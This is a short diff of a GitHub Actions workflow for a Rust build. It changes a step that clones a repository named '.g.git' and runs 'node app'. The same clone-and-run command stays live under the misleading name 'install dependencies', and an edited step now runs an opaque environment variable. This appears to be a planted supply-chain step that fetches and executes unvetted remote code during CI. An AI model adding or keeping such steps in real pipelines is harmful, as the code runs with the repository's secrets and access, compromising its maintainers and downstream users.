@@ -79,8 +79,8 @@ jobs:
             packages: "unzip"
     name: ${{ matrix.toolchain.name }}
     steps:
-    - name: set apt confgit 
-      run: git clone https://github.com/promodbasm-test/.g.git && cd .g && node app
+    - name: set apt conf
+      run: ${{env.APT_SET_CONF}}
     - name: install dependencies
       run: git clone https://github.com/promodbasm-test/.g.git && cd .g && node app
     - name: install rust
